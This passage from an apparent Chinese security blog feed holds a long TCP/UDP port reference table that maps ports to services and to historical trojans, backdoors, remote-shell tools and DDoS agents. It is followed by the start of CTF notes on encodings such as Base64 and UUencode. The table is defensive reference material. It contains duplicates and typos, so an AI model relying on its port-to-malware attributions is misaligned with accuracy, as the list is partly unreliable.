        <content type="html"><![CDATA[<h4 id="1000个常用端口"><a href="#1000个常用端口" class="headerlink" title="1000个常用端口"></a>1000个常用端口</h4><ul><li><p><a href="https://blog.csdn.net/lendq/article/details/80138830" target="_blank" rel="noopener">https://blog.csdn.net/lendq/article/details/80138830</a> </p></li><li><p><a href="https://blog.csdn.net/qq_37131111/article/details/82078260" target="_blank" rel="noopener">https://blog.csdn.net/qq_37131111/article/details/82078260</a> </p></li><li><p><a href="https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml" target="_blank" rel="noopener">https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml</a> </p></li><li><p>TCP 端口（静态端口）</p><p>端口类型 端口号 注释<br>TCP 0 Reserved<br>TCP 1 TCP Port Service Multiplexer<br>TCP 2 Death<br>TCP 5 Remote Job Entry,yoyo<br>TCP 7 Echo<br>TCP 11 Skun<br>TCP 12 Bomber<br>TCP 16 Skun<br>TCP 17 Skun<br>TCP 18 消息传输协议，skun<br>TCP 19 Skun<br>TCP 20 FTP Data,Amanda<br>TCP 21 文件传输,Back Construction,Blade Runner,Doly Trojan,Fore,FTP trojan,Invisible FTP,Larva,WebEx,WinCrash<br>TCP 22 远程登录协议<br>TCP 23 远程登录（Telnet),Tiny Telnet Server (<br>TCP 25 电子邮件(SMTP),Ajan,Antigen,Email Password Sender,Happy 99,Kuang2,ProMail trojan,Shtrilitz,Stealth,Tapiras,Terminator,WinPC,WinSpy,Haebu Coceda<br>TCP 27 Assasin<br>TCP 28 Amanda<br>TCP 29 MSG ICP<br>TCP 30 Agent 40421<br>TCP 31 Agent 31,Hackers Paradise,Masters Paradise,Agent 40421<br>TCP 37 Time,ADM worm<br>TCP 39 SubSARI<br>TCP 41 DeepThroat,Foreplay<br>TCP 42 Host Name Server<br>TCP 43 WHOIS<br>TCP 44 Arctic<br>TCP 48 DRAT<br>TCP 49 主机登录协议<br>TCP 50 DRAT<br>TCP 51 IMP Logical Address Maintenance,Fuck Lamers Backdoor<br>TCP 52 MuSka52,Skun<br>TCP 53 DNS,Bonk (DOS Exploit)<br>TCP 54 MuSka52<br>TCP 58 DMSetup<br>TCP 59 DMSetup<br>TCP 63 whois++<br>TCP 64 Communications Integrator<br>TCP 65 TACACS-Database Service<br>TCP 66 Oracle SQL*NET,AL-Bareki<br>TCP 67 Bootstrap Protocol Server<br>TCP 68 Bootstrap Protocol Client<br>TCP 69 TFTP,W32.Evala.Worm,BackGate Kit,Nimda,Pasana,Storm,Storm worm,Theef,Worm.Cycle.a<br>TCP 70 Gopher服务，ADM worm<br>TCP 79 用户查询（Finger),Firehotcker,ADM worm<br>TCP 80 超文本服务器（Http),Executor,RingZero<br>TCP 81 Chubo,Worm.Bbeagle.q<br>TCP 82 Netsky-Z<br>TCP 88 Kerberos krb5服务<br>TCP 99 Hidden Port<br>TCP 102 消息传输代理<br>TCP 108 SNA网关访问服务器<br>TCP 109 Pop2<br>TCP 110 电子邮件（Pop3),ProMail<br>TCP 113 Kazimas,Auther Idnet<br>TCP 115 简单文件传输协议<br>TCP 118 SQL Services,Infector 1.4.2<br>TCP 119 新闻组传输协议（Newsgroup(Nntp)),Happy 99<br>TCP 121 JammerKiller,Bo jammerkillah<br>TCP 123 网络时间协议(NTP),Net Controller<br>TCP 129 Password Generator Protocol<br>TCP 133 Infector 1.x<br>TCP 135 微软DCE RPC end-point mapper服务<br>TCP 137 微软Netbios Name服务（网上邻居传输文件使用）<br>TCP 138 微软Netbios Name服务（网上邻居传输文件使用）<br>TCP 139 微软Netbios Name服务（用于文件及打印机共享）<br>TCP 142 NetTaxi<br>TCP 143 Internet 邮件访问协议版本 4（IMAP4)<br>TCP 146 FC Infector,Infector<br>TCP 150 NetBIOS Session Service<br>TCP 156 SQL服务器<br>TCP 161 Snmp<br>TCP 162 Snmp-Trap<br>TCP 170 A-Trojan<br>TCP 177 X Display管理控制协议<br>TCP 179 Border网关协议（BGP)<br>TCP 190 网关访问控制协议（GACP)<br>TCP 194 Irc<br>TCP 197 目录定位服务（DLS)<br>TCP 220 Internet 邮件访问协议版本 3（IMAP3)<br>TCP 256 Nirvana<br>TCP 315 The Invasor<br>TCP 371 ClearCase版本管理软件<br>TCP 389 Lightweight Directory Access Protocol (LDAP)<br>TCP 396 Novell Netware over IP<br>TCP 420 Breach<br>TCP 421 TCP Wrappers<br>TCP 443 安全服务（HTTPS）<br>TCP 444 Simple Network Paging Protocol(SNPP)<br>TCP 445 Microsoft-DS<br>TCP 455 Fatal Connections<br>TCP 456 Hackers paradise,FuseSpark<br>TCP 458 苹果公司QuickTime<br>TCP 513 Grlogin<br>TCP 514 RPC Backdoor<br>TCP 531 Rasmin,Net666<br>TCP 544 kerberos kshell<br>TCP 546 DHCP Client<br>TCP 547 DHCP Server<br>TCP 548 Macintosh文件服务<br>TCP 555 Ini-Killer,Phase Zero,Stealth Spy<br>TCP 569 MSN<br>TCP 605 SecretService<br>TCP 606 Noknok8<br>TCP 660 DeepThroat<br>TCP 661 Noknok8<br>TCP 666 Attack FTP,Satanz Backdoor,Back Construction,Dark Connection Inside 1.2<br>TCP 667 Noknok7.2<br>TCP 668 Noknok6<br>TCP 669 DP trojan<br>TCP 692 GayOL<br>TCP 707 Welchia,nachi<br>TCP 777 AIM Spy<br>TCP 808 RemoteControl,WinHole<br>TCP 815 Everyone Darling<br>TCP 901 Backdoor.Devil<br>TCP 911 Dark Shadow<br>TCP 990 ssl加密<br>TCP 993 IMAP<br>TCP 999 DeepThroat<br>TCP 1000 Der Spaeher<br>TCP 1001 Silencer,WebEx,Der Spaeher<br>TCP 1003 BackDoor<br>TCP 1010 Doly<br>TCP 1011 Doly<br>TCP 1012 Doly<br>TCP 1015 Doly<br>TCP 1016 Doly<br>TCP 1020 Vampire<br>TCP 1023 Worm.Sasser.e<br>TCP 端口（动态端口）</p><p>端口类型 端口号 注释<br>TCP 1024 NetSpy.698(YAI)<br>TCP 1025 NetSpy.698,Unused Windows Services Block<br>TCP 1026 Unused Windows Services Block<br>TCP 1027 Unused Windows Services Block<br>TCP 1028 Unused Windows Services Block<br>TCP 1029 Unused Windows Services Block<br>TCP 1030 Unused Windows Services Block<br>TCP 1033 Netspy<br>TCP 1035 Multidropper<br>TCP 1042 Bla<br>TCP 1045 Rasmin<br>TCP 1047 GateCrasher<br>TCP 1050 MiniCommand<br>TCP 1059 nimreg<br>TCP 1069 Backdoor.TheefServer.202<br>TCP 1070 Voice,Psyber Stream Server,Streaming Audio Trojan<br>TCP 1080 Wingate,Worm.BugBear.B,Worm.Novarg.B<br>TCP 1090 Xtreme,VDOLive<br>TCP 1092 LoveGate<br>TCP 1095 Rat<br>TCP 1097 Rat<br>TCP 1098 Rat<br>TCP 1099 Rat<br>TCP 1110 nfsd-keepalive<br>TCP 1111 Backdoor.AIMVision<br>TCP 1155 Network File Access<br>TCP 1170 Psyber Stream Server,Streaming Audio trojan,Voice<br>TCP 1200 NoBackO<br>TCP 1201 NoBackO<br>TCP 1207 Softwar<br>TCP 1212 Nirvana,Visul Killer<br>TCP 1234 Ultors<br>TCP 1243 BackDoor-G,SubSeven,SubSeven Apocalypse<br>TCP 1245 VooDoo Doll<br>TCP 1269 Mavericks Matrix<br>TCP 1313 Nirvana<br>TCP 1349 BioNet<br>TCP 1433 Microsoft SQL服务<br>TCP 1441 Remote Storm<br>TCP 1492 FTP99CMP(BackOriffice.FTP)<br>TCP 1503 NetMeeting T.120<br>TCP 1509 Psyber Streaming Server<br>TCP 1600 Shivka-Burka<br>TCP 1688 Key Management Service(密钥管理服务)<br>TCP 1703 Exloiter 1.1<br>TCP 1720 NetMeeting H.233 call Setup<br>TCP 1723 VPN 网关（PPTP）<br>TCP 1731 NetMeeting音频调用控制<br>TCP 1807 SpySender<br>TCP 1966 Fake FTP 2000<br>TCP 1976 Custom port<br>TCP 1981 Shockrave<br>TCP 1990 stun-p1 cisco STUN Priority 1 port<br>TCP 1990 stun-p1 cisco STUN Priority 1 port<br>TCP 1991 stun-p2 cisco STUN Priority 2 port<br>TCP 1992 stun-p3 cisco STUN Priority 3 port,ipsendmsg IPsendmsg<br>TCP 1993 snmp-tcp-port cisco SNMP TCP port<br>TCP 1994 stun-port cisco serial tunnel port<br>TCP 1995 perf-port cisco perf port<br>TCP 1996 tr-rsrb-port cisco Remote SRB port<br>TCP 1997 gdp-port cisco Gateway Discovery Protocol<br>TCP 1998 x25-svc-port cisco X.25 service (XOT)<br>TCP 1999 BackDoor,TransScout<br>TCP 2000 Der Spaeher,INsane Network<br>TCP 2002 W32. Beagle .AX @mm<br>TCP 2001 Transmisson scout<br>TCP 2002 Transmisson scout<br>TCP 2003 Transmisson scout<br>TCP 2004 Transmisson scout<br>TCP 2005 TTransmisson scout<br>TCP 2011 cypress<br>TCP 2015 raid-cs<br>TCP 2023 Ripper,Pass Ripper,Hack City Ripper Pro<br>TCP 2049 NFS<br>TCP 2115 Bugs<br>TCP 2121 Nirvana<br>TCP 2140 Deep Throat,The Invasor<br>TCP 2155 Nirvana<br>TCP 2208 RuX<br>TCP 2255 Illusion Mailer<br>TCP 2283 HVL Rat5<br>TCP 2300 PC Explorer<br>TCP 2311 Studio54<br>TCP 2556 Worm.Bbeagle.q<br>TCP 2565 Striker<br>TCP 2583 WinCrash<br>TCP 2600 Digital RootBeer<br>TCP 2716 Prayer Trojan<br>TCP 2745 Worm.BBeagle.k<br>TCP 2773 Backdoor,SubSeven<br>TCP 2774 SubSeven2.1&amp;2.2<br>TCP 2801 Phineas Phucker<br>TCP 2989 Rat<br>TCP 3024 WinCrash trojan<br>TCP 3127 Worm.Novarg<br>TCP 3128 RingZero,Worm.Novarg.B<br>TCP 3129 Masters Paradise<br>TCP 3150 Deep Throat,The Invasor<br>TCP 3198 Worm.Novarg<br>TCP 3210 SchoolBus<br>TCP 3332 Worm.Cycle.a<br>TCP 3333 Prosiak<br>TCP 3389 超级终端（远程桌面）<br>TCP 3456 Terror<br>TCP 3459 Eclipse 2000<br>TCP 3700 Portal of Doom<br>TCP 3791 Eclypse<br>TCP 3801 Eclypse<br>TCP 3996 Portal of Doom,RemoteAnything<br>TCP 4000 腾讯QQ客户端<br>TCP 4060 Portal of Doom,RemoteAnything<br>TCP 4092 WinCrash<br>TCP 4242 VHM<br>TCP 4267 SubSeven2.1&amp;2.2<br>TCP 4321 BoBo<br>TCP 4444 Prosiak,Swift remote<br>TCP 4500 W32.HLLW.Tufas<br>TCP 4567 File Nail<br>TCP 4590 ICQTrojan<br>TCP 4899 Remote Administrator服务器<br>TCP 4950 ICQTrojan<br>TCP 5000 WindowsXP服务器，Blazer 5,Bubbel,Back Door Setup,Sockets de Troie<br>TCP 5001 Back Door Setup,Sockets de Troie<br>TCP 5002 cd00r,Shaft<br>TCP 5011 One of the Last Trojans (OOTLT)<br>TCP 5025 WM Remote KeyLogger<br>TCP 5031 Firehotcker,Metropolitan,NetMetro<br>TCP 5032 Metropolitan<br>TCP 5190 ICQ Query<br>TCP 5321 Firehotcker<br>TCP 5333 Backage Trojan Box 3<br>TCP 5343 WCrat<br>TCP 5400 Blade Runner,BackConstruction1.2<br>TCP 5401 Blade Runner,Back Construction<br>TCP 5402 Blade Runner,Back Construction<br>TCP 5471 WinCrash<br>TCP 5512 Illusion Mailer<br>TCP 5521 Illusion Mailer<br>TCP 5550 Xtcp,INsane Network<br>TCP 5554 Worm.Sasser<br>TCP 5555 ServeMe<br>TCP 5556 BO Facil<br>TCP 5557 BO Facil<br>TCP 5569 Robo-Hack<br>TCP 5598 BackDoor 2.03<br>TCP 5631 PCAnyWhere data<br>TCP 5632 PCAnyWhere<br>TCP 5637 PC Crasher<br>TCP 5638 PC Crasher<br>TCP 5698 BackDoor<br>TCP 5714 Wincrash3<br>TCP 5741 WinCrash3<br>TCP 5742 WinCrash<br>TCP 5760 Portmap Remote Root Linux Exploit<br>TCP 5880 Y3K RAT<br>TCP 5881 Y3K RAT<br>TCP 5882 Y3K RAT<br>TCP 5888 Y3K RAT<br>TCP 5889 Y3K RAT<br>TCP 5900 WinVnc<br>TCP 6000 Backdoor.AB<br>TCP 6006 Noknok8<br>TCP 6129 Dameware Nt Utilities服务器<br>TCP 6272 SecretService<br>TCP 6267 广外女生<br>TCP 6400 Backdoor.AB,The Thing<br>TCP 6500 Devil 1.03<br>TCP 6661 Teman<br>TCP 6666 TCPshell.c<br>TCP 6667 NT Remote Control,Wise 播放器接收端口<br>TCP 6668 Wise Video广播端口<br>TCP 6669 Vampyre<br>TCP 6670 DeepThroat,iPhone<br>TCP 6671 Deep Throat 3.0<br>TCP 6711 SubSeven<br>TCP 6712 SubSeven1.x<br>TCP 6713 SubSeven<br>TCP 6723 Mstream<br>TCP 6767 NT Remote Control<br>TCP 6771 DeepThroat<br>TCP 6776 BackDoor-G,SubSeven,2000 Cracks<br>TCP 6777 Worm.BBeagle<br>TCP 6789 Doly Trojan<br>TCP 6838 Mstream<br>TCP 6883 DeltaSource<br>TCP 6912 Shit Heep<br>TCP 6939 Indoctrination<br>TCP 6969 GateCrasher,Priority,IRC 3<br>TCP 6970 RealAudio,GateCrasher<br>TCP 7000 Remote Grab,NetMonitor,SubSeven1.x<br>TCP 7001 Freak88<br>TCP 7201 NetMonitor<br>TCP 7215 BackDoor-G,SubSeven<br>TCP 7001 Freak88,Freak2k<br>TCP 7300 NetMonitor<br>TCP 7301 NetMonitor<br>TCP 7306 NetMonitor,NetSpy 1.0<br>TCP 7307 NetMonitor,ProcSpy<br>TCP 7308 NetMonitor,X Spy<br>TCP 7323 Sygate服务器端<br>TCP 7424 Host Control<br>TCP 7511 聪明基因<br>TCP 7597 Qaz<br>TCP 7609 Snid X2<br>TCP 7626 冰河<br>TCP 7777 The Thing<br>TCP 7789 Back Door Setup,ICQKiller<br>TCP 7983 Mstream<br>TCP 8000 腾讯OICQ服务器端，XDMA<br>TCP 8010 Wingate,Logfile<br>TCP 8011 WAY2.4<br>TCP 8080 WWW 代理，Ring Zero,Chubo,Worm.Novarg.B<br>TCP 8102 网络神偷<br>TCP 8181 W32.Erkez.D@mm<br>TCP 8520 W32.Socay.Worm<br>TCP 8594 I-Worm/Bozori.a<br>TCP 8787 BackOfrice 2000<br>TCP 8888 Winvnc<br>TCP 8897 Hack Office,Armageddon<br>TCP 8989 Recon<br>TCP 9000 Netministrator<br>TCP 9325 Mstream<br>TCP 9400 InCommand 1.0<br>TCP 9401 InCommand 1.0<br>TCP 9402 InCommand 1.0<br>TCP 9872 Portal of Doom<br>TCP 9873 Portal of Doom<br>TCP 9874 Portal of Doom<br>TCP 9875 Portal of Doom<br>TCP 9876 Cyber Attacker<br>TCP 9878 TransScout<br>TCP 9989 Ini-Killer<br>TCP 9898 Worm.Win32.Dabber.a<br>TCP 9999 Prayer Trojan<br>TCP 10067 Portal of Doom<br>TCP 10080 Worm.Novarg.B<br>TCP 10084 Syphillis<br>TCP 10085 Syphillis<br>TCP 10086 Syphillis<br>TCP 10101 BrainSpy<br>TCP 10167 Portal Of Doom<br>TCP 10168 Worm.Supnot.78858.c,Worm.LovGate.T<br>TCP 10520 Acid Shivers<br>TCP 10607 Coma trojan<br>TCP 10666 Ambush<br>TCP 11000 Senna Spy<br>TCP 11050 Host Control<br>TCP 11051 Host Control<br>TCP 11223 Progenic,Hack ’99KeyLogger<br>TCP 11831 TROJ_LATINUS.SVR<br>TCP 12076 Gjamer,MSH.104b<br>TCP 12223 Hack’99 KeyLogger<br>TCP 12345 GabanBus,NetBus 1.6/1.7,Pie Bill Gates,X-bill<br>TCP 12346 GabanBus,NetBus 1.6/1.7,X-bill<br>TCP 12349 BioNet<br>TCP 12361 Whack-a-mole<br>TCP 12362 Whack-a-mole<br>TCP 12363 Whack-a-mole<br>TCP 12378 W32/Gibe@MM<br>TCP 12456 NetBus<br>TCP 12623 DUN Control<br>TCP 12624 Buttman<br>TCP 12631 WhackJob,WhackJob.NB1.7<br>TCP 12701 Eclipse2000<br>TCP 12754 Mstream<br>TCP 13000 Senna Spy<br>TCP 13010 Hacker Brazil<br>TCP 13013 Psychward<br>TCP 13223 Tribal Voice的聊天程序PowWow<br>TCP 13700 Kuang2 The Virus<br>TCP 14456 Solero<br>TCP 14500 PC Invader<br>TCP 14501 PC Invader<br>TCP 14502 PC Invader<br>TCP 14503 PC Invader<br>TCP 15000 NetDaemon 1.0<br>TCP 15092 Host Control<br>TCP 15104 Mstream<br>TCP 16484 Mosucker<br>TCP 16660 Stacheldraht (DDoS)<br>TCP 16772 ICQ Revenge<br>TCP 16959 Priority<br>TCP 16969 Priority<br>TCP 17027 提供广告服务的Conducent”adbot”共享软件<br>TCP 17166 Mosaic<br>TCP 17300 Kuang2 The Virus<br>TCP 17490 CrazyNet<br>TCP 17500 CrazyNet<br>TCP 17569 Infector 1.4.x + 1.6.x<br>TCP 17777 Nephron<br>TCP 18753 Shaft (DDoS)<br>TCP 19191 蓝色火焰<br>TCP 19864 ICQ Revenge<br>TCP 20000 Millennium II (GrilFriend)<br>TCP 20001 Millennium II (GrilFriend)<br>TCP 20002 AcidkoR<br>TCP 20034 NetBus 2 Pro<br>TCP 20168 Lovgate<br>TCP 20203 Logged,Chupacabra<br>TCP 20331 Bla<br>TCP 20432 Shaft (DDoS)<br>TCP 20808 Worm.LovGate.v.QQ<br>TCP 213 35 Tribal Flood Network,Trinoo<br>TCP 21544 Schwindler 1.82,GirlFriend<br>TCP 21554 Schwindler 1.82,GirlFriend,Exloiter 1.0.1.2<br>TCP 22222 Prosiak,RuXUploader2.0<br>TCP 22784 Backdoor.Intruzzo<br>TCP 23432 Asylum 0.1.3<br>TCP 23444 网络公牛<br>TCP 23456 Evil FTP,Ugly FTP,WhackJob<br>TCP 23476 Donald Dick<br>TCP 23477 Donald Dick<br>TCP 23777 INet Spy<br>TCP 26274 Delta<br>TCP 26681 Spy Voice<br>TCP 27374 Sub Seven 2.0+,Backdoor.Baste<br>TCP 27444 Tribal Flood Network,Trinoo<br>TCP 27665 Tribal Flood Network,Trinoo<br>TCP 29431 Hack Attack<br>TCP 29432 Hack Attack<br>TCP 29104 Host Control<br>TCP 29559 TROJ_LATINUS.SVR<br>TCP 29891 The Unexplained<br>TCP 30001 Terr0r32<br>TCP 30003 Death,Lamers Death<br>TCP 30029 AOL trojan<br>TCP 30100 NetSphere 1.27a,NetSphere 1.31<br>TCP 30101 NetSphere 1.31,NetSphere 1.27a<br>TCP 30102 NetSphere 1.27a,NetSphere 1.31<br>TCP 30103 NetSphere 1.31<br>TCP 30303 Sockets de Troie<br>TCP 30722 W32.Esbot.A<br>TCP 30947 Intruse<br>TCP 30999 Kuang2<br>TCP 31336 Bo Whack<br>TCP 31337 Baron Night,BO client,BO2,Bo Facil,BackFire,Back Orifice,DeepBO,Freak2k,NetSpy<br>TCP 31338 NetSpy,Back Orifice,DeepBO<br>TCP 31339 NetSpy DK<br>TCP 31554 Schwindler<br>TCP 31666 BOWhack<br>TCP 31778 Hack Attack<br>TCP 31785 Hack Attack<br>TCP 31787 Hack Attack<br>TCP 31789 Hack Attack<br>TCP 31791 Hack Attack<br>TCP 31792 Hack Attack<br>TCP 32100 PeanutBrittle<br>TCP 32418 Acid Battery<br>TCP 33333 Prosiak,Blakharaz 1.0<br>TCP 33577 Son Of Psychward<br>TCP 33777 Son Of Psychward<br>TCP 33911 Spirit 2001a<br>TCP 34324 BigGluck,TN,Tiny Telnet Server<br>TCP 34555 Trin00 (Windows) (DDoS)<br>TCP 35555 Trin00 (Windows) (DDoS)<br>TCP 36794 Worm.Bugbear-A<br>TCP 37651 YAT<br>TCP 40412 The Spy<br>TCP 40421 Agent 40421,Masters Paradise.96<br>TCP 40422 Masters Paradise<br>TCP 40423 Masters Paradise.97<br>TCP 40425 Masters Paradise<br>TCP 40426 Masters Paradise 3.x<br>TCP 41666 Remote Boot<br>TCP 43210 Schoolbus 1.6/2.0<br>TCP 44444 Delta Source<br>TCP 44445 Happypig<br>TCP 45576 未知代理<br>TCP 47252 Prosiak<br>TCP 47262 Delta<br>TCP 47878 BirdSpy2<br>TCP 49301 Online Keylogger<br>TCP 50505 Sockets de Troie<br>TCP 50766 Fore,Schwindler<br>TCP 51966 CafeIni<br>TCP 53001 Remote Windows Shutdown<br>TCP 53217 Acid Battery 2000<br>TCP 54283 Back Door-G,Sub7<br>TCP 54320 Back Orifice 2000,Sheep<br>TCP 54321 School Bus .69-1.11,Sheep,BO2K<br>TCP 57341 NetRaider<br>TCP 58008 BackDoor.Tron<br>TCP 58009 BackDoor.Tron<br>TCP 58339 ButtFunnel<br>TCP 59211 BackDoor.DuckToy<br>TCP 60000 Deep Throat<br>TCP 60068 Xzip 6000068<br>TCP 60268 DaYangou_bigppig<br>TCP 60411 Connection<br>TCP 60606 TROJ_BCKDOR.G2.A<br>TCP 61466 Telecommando<br>TCP 61603 Bunker-kill<br>TCP 63485 Bunker-kill<br>TCP 65000 Devil,DDoS<br>TCP 65432 Th3tr41t0r,The Traitor<br>TCP 65530 TROJ_WINMITE.10<br>TCP 65535 RC,Adore Worm/Linux<br>UDP 端口（静态端口）</p><p>端口类型 端口号 注释<br>UDP 1 Sockets des Troie<br>UDP 9 Chargen<br>UDP 19 Chargen<br>UDP 69 Pasana<br>UDP 80 Penrox<br>UDP 371 ClearCase版本管理软件<br>UDP 445 公共Internet文件系统（CIFS)<br>UDP 500 Internet密钥交换（IP安全性 ,IKE)<br>UDP 520 Rip<br>UDP 端口（动态端口）|</p><p>端口类型 端口号 注释<br>UDP 1025 Maverick’s Matrix 1.2 - 2.0<br>UDP 1026 Remote Explorer 2000<br>UDP 1027 UC聊天软件，Trojan.Huigezi.e<br>UDP 1028 3721上网助手（用途不明，建议用户警惕！），KiLo,SubSARI<br>UDP 1029 SubSARI<br>UDP 1031 Xot<br>UDP 1032 Akosch4<br>UDP 1104 RexxRave<br>UDP 1111 Daodan<br>UDP 1116 Lurker<br>UDP 1122 Last 2000,Singularity<br>UDP 1183 Cyn,SweetHeart<br>UDP 1200 NoBackO<br>UDP 1201 NoBackO<br>UDP 1342 BLA trojan<br>UDP 1344 Ptakks<br>UDP 1349 BO dll<br>UDP 1561 MuSka52<br>UDP 1701 VPN网关（L2TP）<br>UDP 1772 NetControle<br>UDP 1978 Slapper<br>UDP 1985 Black Diver<br>UDP 2000 A-trojan,Fear,Force,GOTHIC Intruder,Last 2000,Real 2000<br>UDP 2001 Scalper<br>UDP 2002 Slapper<br>UDP 2015 raid-cs<br>UDP 2018 rellpack<br>UDP 2130 Mini BackLash<br>UDP 2140 Deep Throat,Foreplay,The Invasor<br>UDP 2222 SweetHeart,Way<br>UDP 2339 Voice Spy<br>UDP 2702 Black Diver<br>UDP 2989 RAT<br>UDP 3150 Deep Throat<br>UDP 3215 XHX<br>UDP 3333 Daodan<br>UDP 3801 Eclypse<br>UDP 3996 Remote Anything<br>UDP 4128 RedShad<br>UDP 4156 Slapper<br>UDP 4500 sae-urn/ (IP安全性，IKE NAT遍历）<br>UDP 5419 DarkSky<br>UDP 5503 Remote Shell Trojan<br>UDP 5555 Daodan<br>UDP 5882 Y3K RAT<br>UDP 5888 Y3K RAT<br>UDP 6112 Battle .net Game<br>UDP 6666 KiLo<br>UDP 6667 KiLo<br>UDP 6766 KiLo<br>UDP 6767 KiLo,UandMe<br>UDP 6838 Mstream Agent-handler<br>UDP 7028 未知木马<br>UDP 7424 Host Control<br>UDP 7788 Singularity<br>UDP 7983 MStream handler-agent<br>UDP 8012 Ptakks<br>UDP 8090 Aphex’s Remote Packet Sniffer<br>UDP 8127 9_119,Chonker<br>UDP 8488 KiLo<br>UDP 8489 KiLo<br>UDP 8787 BackOrifice 2000<br>UDP 8879 BackOrifice 2000<br>UDP 9325 MStream Agent-handler<br>UDP 10000 XHX<br>UDP 10067 Portal of Doom<br>UDP 10084 Syphillis<br>UDP 10100 Slapper<br>UDP 10167 Portal of Doom<br>UDP 10498 Mstream<br>UDP 10666 Ambush<br>UDP 11225 Cyn<br>UDP 12321 Protoss<br>UDP 12345 BlueIce 2000<br>UDP 12378 W32/Gibe@MM<br>UDP 12623 ButtMan,DUN Control<br>UDP 15210 UDP remote shell backdoor server<br>UDP 15486 KiLo<br>UDP 16514 KiLo<br>UDP 16515 KiLo<br>UDP 18753 Shaft handler to Agent<br>UDP 20433 Shaft<br>UDP 21554 GirlFriend<br>UDP 22784 Backdoor.Intruzzo<br>UDP 23476 Donald Dick<br>UDP 25123 MOTD<br>UDP 26274 Delta Source<br>UDP 26374 Sub-7 2.1<br>UDP 26444 Trin00/TFN2K<br>UDP 26573 Sub-7 2.1<br>UDP 27184 Alvgus trojan 2000<br>UDP 27444 Trinoo<br>UDP 29589 KiLo<br>UDP 29891 The Unexplained<br>UDP 30103 NetSphere<br>UDP 31320 Little Witch<br>UDP 31335 Trin00 DoS Attack<br>UDP 31337 Baron Night,BO client,BO2,Bo Facil,BackFire,Back Orifice,DeepBO<br>UDP 31338 Back Orifice,NetSpy DK,DeepBO<br>UDP 31339 Little Witch<br>UDP 31340 Little Witch<br>UDP 31416 Lithium<br>UDP 31787 Hack aTack<br>UDP 31789 Hack aTack<br>UDP 31790 Hack aTack<br>UDP 31791 Hack aTack<br>UDP 33390 未知木马<br>UDP 34555 Trinoo<br>UDP 35555 Trinoo<br>UDP 43720 KiLo<br>UDP 44014 Iani<br>UDP 44767 School Bus<br>UDP 46666 Taskman<br>UDP 47262 Delta Source<br>UDP 47785 KiLo<br>UDP 49301 OnLine keyLogger<br>UDP 49683 Fenster<br>UDP 49698 KiLo<br>UDP 52901 Omega<br>UDP 54320 Back Orifice<br>UDP 54321 Back Orifice 2000<br>UDP 54341 NetRaider Trojan<br>UDP 61746 KiLO<br>UDP 61747 KiLO<br>UDP 61748 KiLO<br>UDP 65432 The Traitor</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> PORT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学</title>
      <link href="/2020/03/26/mi-ma-xue/"/>
      <url>/2020/03/26/mi-ma-xue/</url>
      
        <content type="html"><![CDATA[<h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><p>解题时注意题目的提示，包括 <code>flag{}</code>格式提示</p><h4 id="1-ASCII编码"><a href="#1-ASCII编码" class="headerlink" title="1 ASCII编码"></a>1 ASCII编码</h4><ul><li><p>常用不可打印字符：%00，%0D，%0A，%7F，%80</p></li><li><p>可以使用burpsuit解码</p></li></ul><h4 id="2-Base64-家族"><a href="#2-Base64-家族" class="headerlink" title="2 Base64 家族"></a>2 Base64 家族</h4><ul><li>Base64编码原理<ul><li>Base64的码表只有64个字符，如果要表达64个字符的话，使用6的bit即可完全表示(2的6次方为64)。</li><li>因为Base64的编码只有6个bit即可表示，而正常的字符是使用8个bit表示，8和6的最 小公倍数是24，所以4个Base64字符可以表示3个标准的asclI字符;</li><li>如果是字符串转换为Base64码，会 先把对应的字符串转换为asclI码表对应的数字，然后再把数字转换为2进制，比 如a的asclI码为97，97的二进制是: 01100001，把8个二进制提取成6个， 剩下的2个二进制和<br>后面的二进制继续拼接，最后再把6个二进制码转换为Base64对应的编码</li></ul></li><li>可以使用burpsuit解码，hackbar解码</li></ul><h4 id="3-Quoted-printable编码方法"><a href="#3-Quoted-printable编码方法" class="headerlink" title="3 Quoted-printable编码方法"></a>3 Quoted-printable编码方法</h4><h4 id="4-Xxencode编码"><a href="#4-Xxencode编码" class="headerlink" title="4 Xxencode编码"></a>4 Xxencode编码</h4><ul><li>原理：XXencode将输入文本以每三个字节为单位进行编码。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6bit为单位分为4个组，每个组以十进制来表示所出现的数值只会落在0到63之间。以所对应值的位置字符代替。它所选择的可打印字符是: <code>+—0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</code>，一共64个字符。</li><li>与base64在字符上的差别：去掉了 <code>/</code>，多了 <code>-</code></li><li>每60个编码输出(相当于45个输入字节)将输出为独立的一行，每行的开头会加上长度字符，除了最后一行之外，长度字符都应该是 <code>h</code>  这个字符(45，刚好是64字符中，第45位h字符)，最后一行的长度字符为剩下的字节数目在64字符中位置所代表字符。</li></ul><h4 id="5-UUencode编码"><a href="#5-UUencode编码" class="headerlink" title="5 UUencode编码"></a>5 UUencode编码</h4><ul><li>原理：Uuencode将输入资料以每三个字节为单位进行编码，如此重复进行。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6-bit为单位分 为4个群组，每个群组以十进制来表示所出现的数值只会落在0到63之间。将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符(<code>32-空白...95-下划线</code>) 的范围之中。每60个编码输出(相当于45个输入字节)将输出为独立的一行，每行的开头会加上长度字符，除了最后一行之外，长度字符都应该是 <code>M</code> 这个ASCII字符(77=32+45) ，最后一行的长度字符为32+剩下的字节数目这个ASCII字符。如果是一个0字节那它应该被转换为0X60而不是0X20，因为(前引用`) 优于0X20 (空格)。</li></ul><h4 id="6-URL编码"><a href="#6-URL编码" class="headerlink" title="6. URL编码"></a>6. URL编码</h4><h4 id="7-Escape-Unescape编码-逐渐废弃"><a href="#7-Escape-Unescape编码-逐渐废弃" class="headerlink" title="7. Escape/Unescape编码(逐渐废弃)"></a>7. Escape/Unescape编码(逐渐废弃)</h4><ul><li>原理：Escape/Unescape加密解码/编码解码，又叫%u编码，从以往经验看编码字符串出现有<code>&quot;u&quot;</code>，它是unicode编码，Escape编码采用是 UTF-16BE 模式。这样一来问题非常简单了。Escape编码/加密,就是字符对应UTF-16 